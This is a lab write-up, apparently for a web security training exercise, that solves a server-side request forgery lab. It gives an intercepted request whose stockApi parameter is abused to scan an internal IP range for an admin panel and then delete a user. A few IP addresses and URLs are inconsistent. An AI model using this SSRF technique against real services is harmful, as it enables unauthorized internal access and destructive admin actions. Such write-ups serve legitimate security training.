# Lab Writeup: Basic SSRF against another back-end system

## Description

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`.

## Solution

1. Go to one of the products' page
2. Check the product stock then intercept using burpsuite, you'll get the following request

   ```
    POST /product/stock HTTP/2
    Host: 0a38004e033507b681aa98cf005f0067.web-security-academy.net
    Cookie: session=gkWFCxvYItdby17MDEUkPqJJV8fPPmhR
    Content-Length: 96
    Sec-Ch-Ua: "Not-A.Brand";v="99", "Chromium";v="124"
    Sec-Ch-Ua-Platform: "Linux"
    Sec-Ch-Ua-Mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Accept: */*
    Origin: https://0a38004e033507b681aa98cf005f0067.web-security-academy.net
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: https://0a38004e033507b681aa98cf005f0067.web-security-academy.net/product?productId=1
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-US,en;q=0.9
    Priority: u=1, i

    stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
   ```

3. Send the request to intruder then change the stockApi to `http://192.168.0.1:8080/admin`, add the sign to `1` at the final octet of the ip address, create a list of payload number from 1 to 255 then start bruteforcing

   ![Basic SSRF Other API 01](/assets/basic-ssrf-other-api-01.png)

   from the above image, we can see that the one that returns `200` as response is `http://192.168.0.158:8080/admin`

   send the earlier response to repeater, then change the stockApi to `http://192.168.0.1:8080/admin`

4. You'll get the link to delete carlos `/http://192.168.0.158:8080/admin/delete?username=carlos` change the stockApi again with that URL then send. The challenge is solved.
